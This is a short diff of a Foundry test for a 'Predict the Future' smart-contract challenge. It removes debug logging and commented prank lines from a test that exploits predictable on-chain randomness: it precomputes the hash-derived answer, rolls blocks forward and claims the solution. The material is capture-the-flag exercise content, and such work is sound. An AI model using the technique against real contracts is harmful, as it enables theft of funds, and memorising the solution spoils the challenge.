@@ -16,7 +16,6 @@ contract PredictTheFutureTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        console.log("testExploitLevel block timestamp: ", block.timestamp);
         uint256 answer = uint256(
             keccak256(
                 abi.encodePacked(
@@ -25,12 +24,9 @@ contract PredictTheFutureTest is BaseTest {
                 )
             )
         ) % 10;
-        console.log("answer: ", answer);
-        // vm.prank(address(0));
         instance.setGuess{value: 0.01 ether}(uint8(answer));
         vm.roll(vm.getBlockNumber() + 2);
         instance.solution();
-        // vm.stopPrank();
         checkSuccess();
     }
 
